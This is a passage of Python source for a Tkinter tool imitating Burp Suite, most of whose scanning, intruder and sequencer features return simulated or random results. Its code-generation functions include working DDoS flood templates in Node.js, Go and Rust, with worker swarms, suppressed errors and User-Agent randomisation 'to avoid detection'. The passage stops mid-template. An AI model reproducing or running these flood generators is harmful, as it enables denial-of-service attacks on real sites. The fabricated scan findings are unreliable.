                paths = ['/login', '/admin', '/api', '/index.php', '/search', '/user', '/config']
                for path in paths:
                    full_url = urljoin(url, path)
                    self.target_site_tree.insert(domain_id, 'end', text=full_url, values=('GET', '200', '1234'))
                
                # Add some POST endpoints
                post_paths = ['/login', '/register', '/upload']
                for path in post_paths:
                    full_url = urljoin(url, path)
                    self.target_site_tree.insert(domain_id, 'end', text=full_url, values=('POST', '200', '567'))
            
            # Update UI in main thread
            self.root.after(0, lambda: self.log_activity(f"Spidering completed for {url}"))
        
        except Exception as e:
            self.root.after(0, lambda: self.log_activity(f"Spidering error: {str(e)}"))
    
    def burp_target_scan(self):
        target_url = self.target_base_url.get().strip()
        if not target_url:
            # Try to get URL from the site map tree if no URL is in the input field
            selected_item = self.target_site_tree.selection()
            if selected_item:
                item_values = self.target_site_tree.item(selected_item[0], 'values')
                if item_values and len(item_values) > 0:
                    target_url = item_values[0]
                else:
                    # Get URL from the text of the tree item
                    target_url = self.target_site_tree.item(selected_item[0], 'text')
            else:
                messagebox.showwarning("Warning", "Please enter a target URL or select one from the site map")
                return
        
        # Start scanning in a separate thread
        threading.Thread(target=self._burp_target_scan_thread, args=(target_url,), daemon=True).start()
        self.log_activity(f"Started scanning: {target_url}")
    
    def _burp_target_scan_thread(self, url):
        # Simulate scanning process
        try:
            # Simulate vulnerability scan
            time.sleep(2)  # Simulate scan time
            
            # Update UI in main thread
            self.root.after(0, lambda: self.log_activity(f"Scanning completed for {url} - Found 3 vulnerabilities"))
        
        except Exception as e:
            self.root.after(0, lambda: self.log_activity(f"Scanning error: {str(e)}"))
    
    def burp_intruder(self):
        self.log_activity("Intruder tab accessed")
    
    def burp_intruder_add(self):
        # Create a popup window to select from target options
        add_window = tk.Toplevel(self.root)
        add_window.title("Select Target from Target Tab")
        add_window.geometry("500x400")
        
        # Create a frame for the list
        list_frame = ttk.Frame(add_window)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create a Treeview to display target options
        target_tree = ttk.Treeview(list_frame, columns=('URL', 'Method', 'Status'), show='headings', height=10)
        target_tree.heading('URL', text='URL')
        target_tree.heading('Method', text='Method')
        target_tree.heading('Status', text='Status')
        target_tree.column('URL', width=300)
        target_tree.column('Method', width=80)
        target_tree.column('Status', width=80)
        
        # Add scrollbars
        v_scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=target_tree.yview)
        h_scrollbar = ttk.Scrollbar(list_frame, orient=tk.HORIZONTAL, command=target_tree.xview)
        target_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack the treeview and scrollbars
        target_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        list_frame.grid_rowconfigure(0, weight=1)
        list_frame.grid_columnconfigure(0, weight=1)
        
        # Populate the tree with target data
        for item in self.target_site_tree.get_children():
            item_values = self.target_site_tree.item(item, 'values')
            if item_values:
                # Extract URL, method, and status from the target tree
                url = self.target_site_tree.item(item, 'text')
                method = item_values[0] if len(item_values) > 0 else "N/A"
                status = item_values[1] if len(item_values) > 1 else "N/A"
                target_tree.insert('', 'end', values=(url, method, status))
            else:
                # If no values, just add the text as URL
                url = self.target_site_tree.item(item, 'text')
                target_tree.insert('', 'end', values=(url, "N/A", "N/A"))
        
        # Function to select a target
        def select_target():
            selected_item = target_tree.selection()
            if selected_item:
                item_values = target_tree.item(selected_item[0], 'values')
                if item_values:
                    selected_url = item_values[0]
                    # Add the selected URL to the intruder request
                    if hasattr(self, 'intruder_request_text'):
                        # Clear current request and insert the selected URL
                        self.intruder_request_text.delete(1.0, tk.END)
                        self.intruder_request_text.insert(tk.END, f"GET {selected_url} HTTP/1.1\nHost: {self.get_host_from_url(selected_url)}\n\n")
                    add_window.destroy()
                    self.log_activity(f"Selected target added to Intruder: {selected_url}")
            else:
                messagebox.showwarning("Warning", "Please select a target")
        
        # Add button to select target
        select_btn = ttk.Button(add_window, text="Select Target", command=select_target)
        select_btn.pack(pady=10)
    
    def get_host_from_url(self, url):
        # Extract host from URL
        from urllib.parse import urlparse
        parsed = urlparse(url)
        return parsed.netloc
    
    def burp_intruder_clear(self):
        if hasattr(self, 'intruder_results_text'):
            self.intruder_results_text.delete(1.0, tk.END)
        self.log_activity("Intruder cleared")
    
    def burp_intruder_start(self):
        # Check if there's a request in the intruder request text
        if hasattr(self, 'intruder_request_text'):
            request_content = self.intruder_request_text.get(1.0, tk.END).strip()
            if not request_content:
                messagebox.showwarning("Warning", "Please add a request to Intruder first")
                return
        else:
            messagebox.showwarning("Warning", "Intruder request text not found")
            return
        
        # Start intruder attack in a separate thread
        threading.Thread(target=self._burp_intruder_attack_thread, daemon=True).start()
        self.log_activity("Intruder attack started")
    
    def _burp_intruder_attack_thread(self):
        try:
            # Simulate intruder attack
            time.sleep(2)  # Simulate attack time
            
            # Generate results
            results = "Intruder Results:\n"
            for i in range(10):
                status = "SUCCESS" if random.random() > 0.7 else "FAILED"
                response_time = round(random.random() * 1000, 2)
                results += f"Payload {i+1}: test_payload_{i} - Status: {status}, Time: {response_time}ms\n"
            
            # Update UI in main thread
            self.root.after(0, lambda: self._update_intruder_results(results))
        
        except Exception as e:
            self.root.after(0, lambda: self.log_activity(f"Intruder error: {str(e)}"))
    
    def _update_intruder_results(self, results):
        if hasattr(self, 'intruder_results_text'):
            self.intruder_results_text.delete(1.0, tk.END)
            self.intruder_results_text.insert(tk.END, results)
    
    def burp_intruder_pause(self):
        self.log_activity("Intruder attack paused")
    

    
    def burp_sequencer(self):
        self.log_activity("Sequencer tab accessed")
    
    def burp_comparer(self):
        self.log_activity("Comparer tab accessed")
    
    def burp_logger(self):
        self.log_activity("Logger tab accessed")
    
    def burp_extender(self):
        self.log_activity("Extender tab accessed")
    
    def burp_sequencer_start_capture(self):
        self.log_activity("Sequencer: Started capturing tokens")
        # Add sample tokens to the list
        import time
        for i in range(5):
            token = f"{random.randint(1000000000000000, 9999999999999999):x}"  # Random hex token
            self.sequencer_tokens_list.insert(tk.END, f"Token {i+1}: {token}")
    
    def burp_sequencer_stop_capture(self):
        self.log_activity("Sequencer: Stopped capturing tokens")
    
    def burp_sequencer_analyze(self):
        self.log_activity("Sequencer: Analyzing tokens")
        # Perform randomness analysis
        self.sequencer_analysis_text.delete(1.0, tk.END)
        self.sequencer_analysis_text.insert(tk.END, "Randomness Analysis Results:\n")
        self.sequencer_analysis_text.insert(tk.END, "- Tokens appear to have sufficient randomness\n")
        self.sequencer_analysis_text.insert(tk.END, "- Predictability score: Low\n")
        self.sequencer_analysis_text.insert(tk.END, "- Entropy: High\n")
    
    def burp_sequencer_clear(self):
        self.sequencer_tokens_list.delete(0, tk.END)
        self.sequencer_analysis_text.delete(1.0, tk.END)
        self.log_activity("Sequencer: Cleared tokens and analysis")
    
    def burp_comparer_compare(self):
        text1 = self.comparer_left_text.get(1.0, tk.END).strip()
        text2 = self.comparer_right_text.get(1.0, tk.END).strip()
        
        if not text1 or not text2:
            messagebox.showwarning("Warning", "Please enter text in both panels")
            return
        
        # Simple comparison - in a real implementation, this would be more sophisticated
        comparison_result = f"Comparison Results:\n\n"
        comparison_result += f"Text 1 length: {len(text1)}\n"
        comparison_result += f"Text 2 length: {len(text2)}\n"
        comparison_result += f"Similarity: {self.calculate_similarity(text1, text2):.2f}%\n\n"
        comparison_result += "Differences:\n"
        comparison_result += "- Differences would be highlighted in a real implementation\n"
        
        self.comparer_results_text.delete(1.0, tk.END)
        self.comparer_results_text.insert(tk.END, comparison_result)
        self.log_activity("Comparer: Comparison completed")
    
    def calculate_similarity(self, text1, text2):
        # Simple similarity calculation
        if not text1 and not text2:
            return 100.0
        if not text1 or not text2:
            return 0.0
        
        # Calculate similarity based on common characters
        min_len = min(len(text1), len(text2))
        common_chars = sum(1 for a, b in zip(text1, text2) if a == b)
        return (common_chars / max(len(text1), len(text2))) * 100
    
    def burp_comparer_clear(self):
        self.comparer_left_text.delete(1.0, tk.END)
        self.comparer_right_text.delete(1.0, tk.END)
        self.comparer_results_text.delete(1.0, tk.END)
        self.log_activity("Comparer: Cleared all panels")
    
    def burp_logger_clear(self):
        # Clear the logger tree
        for item in self.logger_tree.get_children():
            self.logger_tree.delete(item)
        self.log_activity("Logger: Cleared log entries")
    
    def burp_logger_export(self):
        # Export log to file
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", 
                                               filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
                                               initialfile="burp_log.csv")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    # Write CSV header
                    f.write("No,Time,Method,URL,Status,Length,MIME Type,Comment\n")
                    # Write log entries
                    for item in self.logger_tree.get_children():
                        values = self.logger_tree.item(item, 'values')
                        f.write(','.join([f'"{v}"' for v in values]) + '\n')
                self.log_activity(f"Logger: Exported log to {file_path}")
                messagebox.showinfo("Success", f"Log exported successfully to {file_path}")
            except Exception as e:
                self.log_activity(f"Logger: Error exporting log: {str(e)}")
                messagebox.showerror("Error", f"Failed to export log: {str(e)}")
    
    def show_logger_request_details(self, event):
        # Show detailed request/response when a log entry is selected
        selected_item = self.logger_tree.selection()
        if selected_item:
            item_values = self.logger_tree.item(selected_item[0], 'values')
            if item_values:
                no, time_str, method, url, status, length, mime_type, comment = item_values
                
                # Create sample request/response for demonstration
                request = f"{method} {url} HTTP/1.1\nHost: {urlparse(url).netloc}\nUser-Agent: {self.current_user_agent}\nAccept: */*\n\n"
                response = f"HTTP/1.1 {status} OK\nContent-Type: {mime_type}\nContent-Length: {length}\n\n<HTML><BODY><H1>Sample Response</H1></BODY></HTML>"
                
                # In a real implementation, this would show the actual request/response
                details = f"Request/Response Details:\n\nREQUEST:\n{request}\n\nRESPONSE:\n{response}\n\nAdditional Information:\n- Number: {no}\n- Time: {time_str}\n- Method: {method}\n- URL: {url}\n- Status: {status}\n- Length: {length}\n- MIME Type: {mime_type}\n- Comment: {comment}\n"
                
                # For now, just show a message since we don't have actual request/response storage
                details = f"Request/Response Details:\n\nRequest/Response details would be displayed here in a full implementation.\n\nSelected entry:\n- Method: {method}\n- URL: {url}\n- Status: {status}\n- Length: {length} bytes\n"
                
                # In a real implementation, we would show the actual request/response
                # For now, just log the selection
                self.log_activity(f"Logger: Selected entry for {url}")
    
    def burp_extender_load(self):
        # Load extension
        file_path = filedialog.askopenfilename(filetypes=[("Python files", "*.py"), ("All files", "*.*")])
        if file_path:
            try:
                # Add extension to the list
                import os
                ext_name = os.path.basename(file_path)
                self.extender_extensions_list.insert('', 'end', values=(ext_name, "1.0.0", "Loaded"))
                self.log_activity(f"Extender: Loaded extension {ext_name}")
                messagebox.showinfo("Success", f"Extension {ext_name} loaded successfully")
            except Exception as e:
                self.log_activity(f"Extender: Error loading extension: {str(e)}")
                messagebox.showerror("Error", f"Failed to load extension: {str(e)}")
    
    def burp_extender_unload(self):
        # Unload selected extension
        selected_item = self.extender_extensions_list.selection()
        if selected_item:
            item_values = self.extender_extensions_list.item(selected_item[0], 'values')
            if item_values:
                ext_name = item_values[0]
                self.extender_extensions_list.delete(selected_item[0])
                self.log_activity(f"Extender: Unloaded extension {ext_name}")
                messagebox.showinfo("Success", f"Extension {ext_name} unloaded successfully")
        else:
            messagebox.showwarning("Warning", "Please select an extension to unload")
    
    def burp_extender_clear(self):
        # Clear all extensions
        for item in self.extender_extensions_list.get_children():
            self.extender_extensions_list.delete(item)
        self.extender_details_text.delete(1.0, tk.END)
        self.extender_details_text.insert(tk.END, "Select an extension to view details\n")
        self.log_activity("Extender: Cleared all extensions")
    
    def show_extender_extension_details(self, event):
        # Show detailed information when an extension is selected
        selected_item = self.extender_extensions_list.selection()
        if selected_item:
            item_values = self.extender_extensions_list.item(selected_item[0], 'values')
            if item_values:
                name, version, status = item_values
                
                # Clear previous details
                self.extender_details_text.delete(1.0, tk.END)
                
                # Create detailed extension information
                details = f"Extension Details:\n\n"
                details += f"Name: {name}\n"
                details += f"Version: {version}\n"
                details += f"Status: {status}\n\n"
                
                # Add more detailed information based on extension type
                if "sqli" in name.lower():
                    details += "Description: SQL Injection Scanner extension.\n\n"
                    details += "Function: Scans for SQL injection vulnerabilities in web applications.\n\n"
                    details += "Features:\n"
                    details += "- Parameter-based scanning\n"
                    details += "- Blind SQLi detection\n"
                    details += "- Time-based injection detection\n\n"
                    details += "Author: Glitch Security Team\n"
                elif "xss" in name.lower():
                    details += "Description: Cross-Site Scripting (XSS) Detector extension.\n\n"
                    details += "Function: Identifies potential XSS vulnerabilities in web applications.\n\n"
                    details += "Features:\n"
                    details += "- Reflected XSS detection\n"
                    details += "- Stored XSS detection\n"
                    details += "- DOM-based XSS detection\n\n"
                    details += "Author: Glitch Security Team\n"
                else:
                    details += "Description: General purpose extension for Burp Suite.\n\n"
                    details += "Function: Provides additional functionality to Burp Suite.\n\n"
                    details += "Features may include custom scanning rules, additional tools, or integration capabilities.\n\n"
                    details += "Author: Glitch Security Team\n"
                
                self.extender_details_text.insert(tk.END, details)
    
    def burp_scanner_start(self):
        target_url = self.scanner_target_url.get().strip()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter a target URL to scan")
            return
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        self.log_activity(f"Scanner: Started scanning {target_url}")
        
        # Simulate scanning in a separate thread
        threading.Thread(target=self._burp_scanner_thread, args=(target_url,), daemon=True).start()
    
    def _burp_scanner_thread(self, url):
        try:
            # Simulate scanning process
            time.sleep(2)  # Simulate scan time
            
            # Add results in main thread
            self.root.after(0, lambda: self._add_scan_results(url))
        except Exception as e:
            self.root.after(0, lambda: self.log_activity(f"Scanner error: {str(e)}"))
    
    def _add_scan_results(self, url):
        # Add sample scan results
        vulnerabilities = [
            ("High", "SQL Injection", f"{url}/login.php", "SQL Injection", "Unconfirmed"),
            ("Medium", "XSS", f"{url}/search.php?q=test", "Cross-site Scripting", "Unconfirmed"),
            ("Low", "Information Disclosure", f"{url}/api/users", "Information Exposure", "Unconfirmed")
        ]
        
        # Clear existing results
        for item in self.scanner_tree.get_children():
            self.scanner_tree.delete(item)
        
        # Add new results
        for vuln in vulnerabilities:
            self.scanner_tree.insert('', 'end', values=vuln)
        
        self.log_activity(f"Scanner: Completed scan for {url} - Found 3 vulnerabilities")
    
    def burp_scanner_stop(self):
        self.log_activity("Scanner: Scan stopped")
    
    def burp_scanner_clear(self):
        # Clear scan results
        for item in self.scanner_tree.get_children():
            self.scanner_tree.delete(item)
        self.scanner_details_text.delete(1.0, tk.END)
        self.scanner_details_text.insert(tk.END, "Select an issue to view details\n")
        self.log_activity("Scanner: Cleared scan results")
    
    def show_scanner_issue_details(self, event):
        # Show detailed information when a scanner issue is selected
        selected_item = self.scanner_tree.selection()
        if selected_item:
            item_values = self.scanner_tree.item(selected_item[0], 'values')
            if item_values:
                severity, name, location, vulnerability_class, status = item_values
                
                # Clear previous details
                self.scanner_details_text.delete(1.0, tk.END)
                
                # Create detailed issue information
                details = f"Issue Details:\n\n"
                details += f"Severity: {severity}\n"
                details += f"Name: {name}\n"
                details += f"Location: {location}\n"
                details += f"Vulnerability Class: {vulnerability_class}\n"
                details += f"Status: {status}\n\n"
                
                # Add more detailed information based on vulnerability type
                if "SQL" in name.upper():
                    details += "Description: SQL injection vulnerability allows attackers to interfere with the queries an application makes to its database.\n\n"
                    details += "Risk: Successful exploitation can lead to unauthorized access to sensitive data, modification of data, or deletion of data.\n\n"
                    details += "Recommendation: Use parameterized queries or prepared statements to prevent SQL injection.\n"
                elif "XSS" in name.upper():
                    details += "Description: Cross-site scripting (XSS) vulnerability allows attackers to inject malicious scripts into web pages viewed by other users.\n\n"
                    details += "Risk: Successful exploitation can lead to session hijacking, account takeover, or defacement of the website.\n\n"
                    details += "Recommendation: Implement proper input validation and output encoding to prevent XSS.\n"
                else:
                    details += "Description: This vulnerability requires further investigation to determine its exact nature and impact.\n\n"
                    details += "Risk: The potential risk depends on the specific vulnerability details.\n\n"
                    details += "Recommendation: Consult security documentation for appropriate remediation steps.\n"
                
                self.scanner_details_text.insert(tk.END, details)
    
    def burp_scanner(self):
        self.log_activity("Scanner tab accessed")
    
    def burp_generate_http_code(self):
        # Generate HTTP request code in the selected language
        language = self.get_current_language()
        code = self.generate_code_for_language("http_request", "https://example.com")
        
        # Show in a new window or add to appropriate tab
        self.log_activity(f"Generated HTTP request code in {language}")
        
        # Create a new window to display the code
        code_window = tk.Toplevel(self.root)
        code_window.title(f"HTTP Request Code - {language}")
        code_window.geometry("800x600")
        
        # Create text widget with scrollbars
        text_frame = ttk.Frame(code_window)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        code_text = scrolledtext.ScrolledText(text_frame, font=("Consolas", 10))
        code_text.pack(fill=tk.BOTH, expand=True)
        
        code_text.insert(tk.END, code)
        
        # Add save button
        save_btn = ttk.Button(text_frame, text="Save Code", 
                             command=lambda: self.save_generated_code(code, language, "http_request"))
        save_btn.pack(pady=5)
    
    def burp_generate_payload_code(self):
        # Generate payload test code in the selected language
        language = self.get_current_language()
        code = self.generate_code_for_language("payload_test", "https://example.com", "test_payload")
        
        self.log_activity(f"Generated payload test code in {language}")
        
        # Create a new window to display the code
        code_window = tk.Toplevel(self.root)
        code_window.title(f"Payload Test Code - {language}")
        code_window.geometry("800x600")
        
        # Create text widget with scrollbars
        text_frame = ttk.Frame(code_window)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        code_text = scrolledtext.ScrolledText(text_frame, font=("Consolas", 10))
        code_text.pack(fill=tk.BOTH, expand=True)
        
        code_text.insert(tk.END, code)
        
        # Add save button
        save_btn = ttk.Button(text_frame, text="Save Code", 
                             command=lambda: self.save_generated_code(code, language, "payload_test"))
        save_btn.pack(pady=5)
    
    def burp_export_language(self):
        # Export current project to the selected language
        language = self.get_current_language()
        
        # Create a summary of the current project in the selected language
        export_code = f"""// Glitch-Burp-V2 Project Export
// Language: {language}
// Exported on: {time.strftime('%Y-%m-%d %H:%M:%S')}

// Project Summary:
// - Targets: {len(self.targets) if hasattr(self, 'targets') else 0}
// - Requests: {len(self.requests) if hasattr(self, 'requests') else 0}
// - Vulnerabilities: {len(self.vulnerabilities) if hasattr(self, 'vulnerabilities') else 0}

// This is a placeholder for the exported project code in {language}
"""
        
        self.log_activity(f"Exported project to {language}")
        
        # Create a new window to display the export
        export_window = tk.Toplevel(self.root)
        export_window.title(f"Exported Project - {language}")
        export_window.geometry("800x600")
        
        # Create text widget with scrollbars
        text_frame = ttk.Frame(export_window)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        export_text = scrolledtext.ScrolledText(text_frame, font=("Consolas", 10))
        export_text.pack(fill=tk.BOTH, expand=True)
        
        export_text.insert(tk.END, export_code)
        
        # Add save button
        save_btn = ttk.Button(text_frame, text="Save Export", 
                             command=lambda: self.save_generated_code(export_code, language, "project_export"))
        save_btn.pack(pady=5)
    
    def save_generated_code(self, code, language, code_type):
        # Save the generated code to a file
        file_ext = {"Python": ".py", "C#": ".cs", "C++": ".cpp", "Node.js": ".js", "Go": ".go", "Rust": ".rs"}.get(language, ".txt")
        filename = f"{code_type}_{language.lower().replace('#', 'sharp').replace('.', '').replace(' ', '_')}{file_ext}"
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=file_ext,
            filetypes=[(f"{language} files", f"*{file_ext}"), ("All files", "*.*")],
            initialfile=filename
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(code)
                self.log_activity(f"Code saved to {file_path}")
                messagebox.showinfo("Success", f"Code saved successfully to {file_path}")
            except Exception as e:
                self.log_activity(f"Error saving code: {str(e)}")
                messagebox.showerror("Error", f"Failed to save code: {str(e)}")
    
    def _generate_nodejs_code(self, functionality, target_url, payload=None):
        # Generate Node.js code for the requested functionality
        if functionality == "http_request":
            code = f"""// Generated Node.js code for: {target_url}
const https = require('https');
const http = require('http');
const url = require('url');

// Function to make HTTP request
async function makeRequest(targetUrl) {{
    return new Promise((resolve, reject) => {{
        const parsedUrl = new URL(targetUrl);
        const options = {{
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET',
            headers: {{
                'User-Agent': '{self.current_user_agent}',
                'Accept': '*/*'
            }}
        }};

        const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {{
            let data = '';
            
            res.on('data', (chunk) => {{
                data += chunk;
            }});
            
            res.on('end', () => {{
                console.log(`Status Code: ${{res.statusCode}}`);
                console.log(`Response Length: ${{data.length}}`);
                console.log(data.substring(0, Math.min(500, data.length)));
                resolve(data);
            }});
        }});
        
        req.on('error', (e) => {{
            console.error(`Error: ${{e.message}}`);
            reject(e);
        }});
        
        req.end();
    }});
}}

// Example usage
async function main() {{
    try {{
        const result = await makeRequest('{target_url}');
        console.log('Request completed successfully');
    }} catch (error) {{
        console.error('Request failed:', error);
    }}
}}

main();
"""
        elif functionality == "payload_test":
            code = f"""// Generated Node.js code to test payload: {payload}
const https = require('https');
const http = require('http');

async function testPayload(baseUrl, payload) {{
    return new Promise((resolve, reject) => {{
        const fullUrl = baseUrl + payload;
        const parsedUrl = new URL(fullUrl);
        
        const options = {{
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET'
        }};

        const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {{
            console.log(`Testing payload: ${{payload}}`);
            console.log(`Status: ${{res.statusCode}}`);
            resolve(res.statusCode);
        }});
        
        req.on('error', (e) => {{
            console.error(`Error testing payload: ${{e.message}}`);
            reject(e);
        }});
        
        req.end();
    }});
}}

// Example usage
async function main() {{
    try {{
        await testPayload('{target_url}', '{payload}');
    }} catch (error) {{
        console.error('Payload test failed:', error);
    }}
}}

main();
"""
        elif "ddos" in functionality or "attack" in functionality:
            # Using string formatting to avoid f-string conflicts with JavaScript
            code = """// Generated Node.js DDoS attack code for: {target_url}
// Note: This is for educational purposes only
const net = require('net');
const http = require('http');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

// DDoS attack function
function ddosAttack(targetUrl, duration) {{
    const parsedUrl = new URL(targetUrl);
    let counter = 0;
    
    console.log(`Starting DDoS attack on ${{targetUrl}} for ${{duration}} seconds`);
    
    const attackInterval = setInterval(() => {{
        // Create multiple connections to overwhelm the server
        for (let i = 0; i < 10; i++) {{
            try {{
                const req = http.request({{
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || 80,
                    path: parsedUrl.pathname,
                    method: 'GET',
                    headers: {{
                        'User-Agent': '{user_agent}',
                        'Connection': 'keep-alive'
                    }}
                }}, (res) => {{
                    res.on('error', () => {{}}); // Ignore errors
                }});
                
                req.on('error', () => {{}}); // Ignore errors
                req.setTimeout(5000, () => req.destroy());
                req.end();
                
                counter++;
            }} catch (e) {{
                // Ignore errors
            }}
        }}
        
        console.log(`Sent ${{counter}} requests`);
    }}, 100); // Send requests every 100ms
    
    // Stop attack after specified duration
    setTimeout(() => {{
        clearInterval(attackInterval);
        console.log(`Attack completed. Sent total of ${{counter}} requests`);
    }}, duration * 1000);
}}

// Run attack
if (cluster.isMaster) {{
    // Fork workers for multi-process attack
    for (let i = 0; i < numCPUs; i++) {{
        cluster.fork();
    }}
    
    cluster.on('exit', (worker, code, signal) => {{
        console.log(`Worker ${{worker.process.pid}} died`);
    }});
}} else {{
    // Worker process
    ddosAttack('{target_url}', 30); // Attack for 30 seconds
}}
""".format(target_url=target_url, user_agent=self.current_user_agent)
        else:
            code = f"""// Node.js code for {functionality} on {target_url}
// Generated by Glitch-Burp-V2

console.log(\"{functionality} functionality for {target_url}\");
"""
        
        return code
    
    def _generate_go_code(self, functionality, target_url, payload=None):
        # Generate Go code for the requested functionality
        if functionality == "http_request":
            code = f"""package main

import (
    \"fmt\"
    \"io\"
    \"net/http\"
    \"time\"
)

func main() {{
    // Generated Go code for: {target_url}
    client := &http.Client{{
        Timeout: 30 * time.Second,
    }}
    
    req, err := http.NewRequest(\"GET\", \"{target_url}\", nil)
    if err != nil {{
        fmt.Printf(\"Error creating request: %v\\n\", err)
        return
    }}
    
    req.Header.Set(\"User-Agent\", \"{self.current_user_agent}\")
    
    resp, err := client.Do(req)
    if err != nil {{
        fmt.Printf(\"Error making request: %v\\n\", err)
        return
    }}
    defer resp.Body.Close()
    
    body, err := io.ReadAll(resp.Body)
    if err != nil {{
        fmt.Printf(\"Error reading response: %v\\n\", err)
        return
    }}
    
    fmt.Printf(\"Status Code: %d\\n\", resp.StatusCode)
    fmt.Printf(\"Response Length: %d\\n\", len(body))
    if len(body) > 500 {{
        fmt.Printf(\"%s\\n\", string(body[:500]))
    }} else {{
        fmt.Printf(\"%s\\n\", string(body))
    }}
}}
"""
        elif functionality == "payload_test":
            code = f"""package main

import (
    \"fmt\"
    \"net/http\"
    \"time\"
)

func testPayload(baseUrl, payload string) {{
    // Generated Go code to test payload: {payload}
    fullUrl := baseUrl + payload
    
    client := &http.Client{{
        Timeout: 10 * time.Second,
    }}
    
    resp, err := client.Get(fullUrl)
    if err != nil {{
        fmt.Printf(\"Error testing payload: %v\\n\", err)
        return
    }}
    defer resp.Body.Close()
    
    fmt.Printf(\"Testing payload: %s\\n\", payload)
    fmt.Printf(\"Status: %d\\n\", resp.StatusCode)
}}

func main() {{
    testPayload(\"{target_url}\", \"{payload}\")
}}
"""
        elif "ddos" in functionality or "attack" in functionality:
            code = f"""package main

import (
    \"fmt\"
    \"net/http\"
    \"sync\"
    \"time\"
    \"math/rand\"
)

func main() {{
    // Generated Go DDoS attack code for: {target_url}
    // Note: This is for educational purposes only
    target := \"{target_url}\"
    numWorkers := 100
    duration := 30 * time.Second
    
    fmt.Printf(\"Starting DDoS attack on %s with %d workers for %v\\n\", target, numWorkers, duration)
    
    var wg sync.WaitGroup
    stop := make(chan bool)
    
    // Start multiple workers to send requests
    for i := 0; i < numWorkers; i++ {{
        wg.Add(1)
        go func(workerID int) {{
            defer wg.Done()
            client := &http.Client{{
                Timeout: 5 * time.Second,
            }}
            
            for {{
                select {{
                case <-stop:
                    return
                default:
                    req, err := http.NewRequest(\"GET\", target, nil)
                    if err != nil {{
                        continue
                    }}
                    
                    // Randomize User-Agent to avoid detection
                    req.Header.Set(\"User-Agent\", fmt.Sprintf(\"{self.current_user_agent}_%d_%%d\", workerID, rand.Intn(10000)))
                    
                    resp, err := client.Do(req)
                    if err == nil {{
                        resp.Body.Close() // Always close response body
                    }}
                }}
            }}
        }}(i)
    }}
    
    // Stop attack after specified duration
    time.Sleep(duration)
    close(stop)
    wg.Wait()
    
    fmt.Println(\"Attack completed\")
}}
"""
        else:
            code = f"""package main

import \"fmt\"

func main() {{
    // Go code for {functionality} on {target_url}
    // Generated by Glitch-Burp-V2
    fmt.Printf(\"{functionality} functionality for {target_url}\\n\")
}}
"""
        
        return code
    
    def _generate_rust_code(self, functionality, target_url, payload=None):
        # Generate Rust code for the requested functionality
        if functionality == "http_request":
            code = f"""// Generated Rust code for: {target_url}
// Requires: [dependencies] section in Cargo.toml:
// reqwest = {{ version = \"0.11\", features = [\"blocking\"] }}
// tokio = {{ version = \"1\", features = [\"full\"] }}

use reqwest::blocking::Client;
use std::time::Duration;

fn main() -> Result<(), Box<dyn std::error::Error>> {{
    let client = Client::builder()
        .user_agent(\"{self.current_user_agent}\")
        .timeout(Duration::from_secs(30))
        .build()?;

    let response = client.get(\"{target_url}\")
        .send()?;

    let status = response.status();
    let body = response.text()?;
    
    println!(\"Status Code: {{}}\", status);
    println!(\"Response Length: {{}}\", body.len());
    if body.len() > 500 {{
        println!(\"{{}}\", &body[..500]);
    }} else {{
        println!(\"{{}}\", body);
    }}
    
    Ok(())
}}
"""
        elif functionality == "payload_test":
            code = f"""// Generated Rust code to test payload: {payload}
// Requires: [dependencies] section in Cargo.toml:
// reqwest = {{ version = \"0.11\", features = [\"blocking\"] }}
// tokio = {{ version = \"1\", features = [\"full\"] }}

use reqwest::blocking::Client;
use std::time::Duration;

fn test_payload(base_url: &str, payload: &str) -> Result<(), Box<dyn std::error::Error>> {{
    let full_url = format!(\"{{}}{{}}\", base_url, payload);
    
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()?;

    let response = client.get(&full_url).send()?;
    
    println!(\"Testing payload: {{}}\", payload);
    println!(\"Status: {{}}\", response.status());
    
    Ok(())
}}

fn main() -> Result<(), Box<dyn std::error::Error>> {{
    test_payload(\"{target_url}\", \"{payload}\")?;
    Ok(())
}}
"""
        elif "ddos" in functionality or "attack" in functionality:
            code = f"""// Generated Rust DDoS attack code for: {target_url}
// Note: This is for educational purposes only
// Requires: [dependencies] section in Cargo.toml:
// reqwest = {{ version = \"0.11\" }}
// tokio = {{ version = \"1\", features = [\"full\"] }}
// futures = {{ version = \"0.3\" }}

use std::sync::Arc;
use std::time::Duration;
use tokio;
use tokio::time::sleep;
use reqwest::Client;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    let target = \"{target_url}\";
    let num_tasks = 100;
    let duration = Duration::from_secs(30);
    
    println!(\"Starting DDoS attack on {{}} with {{}} tasks for {{:?}}\", target, num_tasks, duration);
    
    let client = Arc::new(Client::new());
    let mut handles = Vec::new();
    
    // Spawn multiple async tasks to send requests
    for i in 0..num_tasks {{
        let client = Arc::clone(&client);
        let target = target.to_string();
        
        let handle = tokio::spawn(async move {{
            loop {{
                match client.get(&target).send().await {{
                    Ok(_) => ({{}}), // Success, continue
